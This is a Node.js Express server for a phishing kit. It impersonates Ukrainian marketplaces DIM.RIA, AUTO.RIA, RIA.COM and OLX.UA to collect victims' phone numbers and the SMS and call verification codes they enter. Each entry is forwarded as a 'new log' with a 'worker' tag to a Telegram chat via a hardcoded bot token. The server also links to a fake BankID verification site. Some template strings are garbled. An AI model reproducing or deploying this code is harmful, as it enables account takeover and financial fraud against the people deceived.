const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// === ТВОИ ДАННЫЕ ===
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const BANKID_URL = "https://idverification.onrender.com";

// === ЛОГОТИПЫ И НАЗВАНИЯ ПРОЕКТОВ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA", autoria: "AUTO.RIA", ria: "RIA.COM", olx: "OLX.UA"
};

app.use(bodyParser.json());
app.use(express.static(__dirname));

// Главная страница
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!Object.keys(LOGOS).includes(project)) return res.status(400).send('Invalid project');
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    res.redirect(LOGOS[project] || LOGOS.dimria);
});

// === ОТПРАВКА В ТЕЛЕГУ ===
async function sendMessage(text, reply_markup = null) {
    const payload = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
    };
    if (reply_markup) payload.reply_markup = reply_markup;

    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            if (data.ok) return data.result;
        } catch (e) { console.log('TG error:', e.message); }
        await new Promise(r => setTimeout(r, 2000));
    }
}

// === АВТО-ВЕБХУК ПРИ СТАРТЕ ===
async function setWebhook() {
    let url = `http://localhost:\( {PORT}/bot \){BOT_TOKEN}`;
    if (process.env.RENDER_EXTERNAL_URL) {
        url = `\( {process.env.RENDER_EXTERNAL_URL}/bot \){BOT_TOKEN}`;
    } else if (process.env.RAILWAY_STATIC_URL) {
        url = `\( {process.env.RAILWAY_STATIC_URL}/bot \){BOT_TOKEN}`;
    } else if (process.env.HEROKU_APP_NAME) {
        url = `https://\( {process.env.HEROKU_APP_NAME}.herokuapp.com/bot \){BOT_TOKEN}`;
    }

    try {
        const res = await fetch(`https://api.telegram.org/bot\( {BOT_TOKEN}/setWebhook?url= \){url}`);
        const json = await res.json();
        if (json.ok) {
            console.log('Webhook успешно установлен:', url);
            await sendMessage(`*Сервер запущен и готов!* \nПроекты: DIM.RIA • AUTO.RIA • RIA • OLX\nWebhook: \`${url}\``);
        } else {
            console.log('Ошибка установки вебхука:', json);
        }
    } catch (e) {
        console.log('Ошибка setWebhook:', e.message);
    }
}

// === ПРИЁМ ДАННЫХ С САЙТА ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, worker = '', project = 'dimria', city = 'Невідомо' } = req.body;
    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
    const workerTag = worker ? `\n*Воркер:* @${worker}` : '';

    let text = '';
    let keyboard = null;

    if (step === 'phone' && phone) {
        text = `*НОВИЙ ЛОГ*\n*Проект:* \( {projectName}\n*Номер:* \` \){phone}\`\n*Місто:* \( {city} \){workerTag}`;
        keyboard = {
            inline_keyboard: [
                [{ text: "Звонок", callback_data: `call_${phone}` }],
                [{ text: "Код", callback_data: `sms_${phone}` }],
                [{ text: "BankID", url: BANKID_URL }]
            ]
        };
    }
    else if (step === 'method_call') text = `*ОБРАНО:* Звонок \n*Номер:* \`\( {phone}\` \){workerTag}`;
    else if (step === 'method_sms') text = `*ОБРАНО:* Код \n*Номер:* \`\( {phone}\` \){workerTag}`;
    else if (step === 'method_bankid') text = `*ОБРАНО:* BankID \n*Номер:* \`\( {phone}\` \){workerTag}`;
    else if (step === 'call_code') text = `*КОД ДЗВІНКА:* \`\( {code}\`\n*Номер:* \` \){phone}\`${workerTag}`;
    else if (step === 'sms_code') text = `*SMS КОД:* \`\( {code}\`\n*Номер:* \` \){phone}\`${workerTag}`;
    else return res.status(400).send('Bad step');

    await sendMessage(text, keyboard);
    res.json({ success: true });
});

// === ОБРАБОТКА КНОПОК В ТЕЛЕГЕ ===
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    res.sendStatus(200);

    if (req.body.callback_query) {
        const data = req.body.callback_query.data;
        const phone = data.split('_')[1] || 'невідомо';

        if (data.startsWith('call_')) {
            await sendMessage(`*ОБРАНО МЕТОД:* Звонок \n*Номер:* \`${phone}\``);
        }
        if (data.startsWith('sms_')) {
            await sendMessage(`*ОБРАНО МЕТОД:* Код \n*Номер:* \`${phone}\``);
        }
    }
});

// === ЗАПУСК ===
app.listen(PORT, async () => {
    console.log(`Сервер запущен на порту ${PORT}`);
    await setWebhook(); // Автоматически ставит вебхук при каждом запуске
});
